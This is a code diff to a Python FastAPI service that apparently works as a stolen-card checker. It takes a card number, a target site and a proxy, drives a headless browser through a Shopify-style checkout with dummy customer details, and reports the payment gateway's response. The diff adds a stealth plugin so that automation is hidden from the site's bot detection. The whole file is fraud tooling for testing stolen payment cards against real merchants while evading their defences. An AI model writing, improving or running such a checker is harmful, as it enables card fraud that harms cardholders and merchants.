@@ -1,5 +1,6 @@
 from fastapi import FastAPI, Query
 from playwright.async_api import async_playwright
+from playwright_stealth import stealth_async
 import uvicorn
 
 app = FastAPI()
@@ -17,23 +18,24 @@ async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = 
             context_args["proxy"] = {"server": proxy}
             
         context = await browser.new_context(**context_args)
-        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
         page = await context.new_page()
+        
+        # تطبيق إضافة Stealth لإخفاء بصمة الأتمتة
+        await stealth_async(page)
         
         try:
             await page.goto(f"{site}/checkout", timeout=60000, wait_until="networkidle")
             
-            # محددات شاملة للحقول لتجاوز الـ Timeout
+            # ملء بيانات العميل
             await page.locator('input[type="email"], input[name*="email"]').first.fill("user@example.com")
             await page.locator('input[name*="firstName"], input[placeholder*="First name"]').first.fill("John")
             await page.locator('input[name*="lastName"], input[placeholder*="Last name"]').first.fill("Doe")
             await page.locator('input[name*="address1"], input[placeholder*="Address"]').first.fill("123 Street")
             
-            # الضغط على زر المتابعة
+            # الانتقال لخطوة الدفع
             await page.locator('button[type="submit"], button:has-text("Continue")').first.click()
             await page.wait_for_load_state("networkidle", timeout=15000)
             
-            # محاولة تخطي خطوة الشحن
             try:
                 await page.locator('button:has-text("Continue to payment")').click(timeout=5000)
                 await page.wait_for_load_state("networkidle", timeout=15000)
@@ -58,3 +60,6 @@ async def check_card(cc: str = Query(...), site: str = Query(...), proxy: str = 
         except Exception as e:
             await browser.close()
             return {"Gateway": "Shopify Payments", "Response": "FAILED", "Details": str(e), "Status": "false", "CC": cc}
+
+if __name__ == "__main__":
+    uvicorn.run(app, host="0.0.0.0", port=8000)
